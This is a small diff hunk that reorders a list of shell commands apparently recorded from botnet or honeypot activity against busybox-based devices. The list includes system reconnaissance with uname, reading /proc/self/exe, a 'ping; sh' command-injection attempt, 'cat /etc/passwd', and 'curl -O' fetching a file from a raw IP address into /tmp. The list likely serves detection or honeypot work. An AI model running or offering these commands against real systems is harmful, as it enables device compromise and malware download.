@@ -19,9 +19,9 @@ uname -s -v -n -m 2 > /dev/null
 uname -s -v -n -r -m
 /bin/busybox cat /proc/self/exe || cat /proc/self/exe
 ping; sh
+uname -a
 echo xsec
 /bin/./uname -s -v -n -r -m
-uname -a
 cat /etc/passwd
 cd /tmp
 curl -O http://5.182.210.174/ok
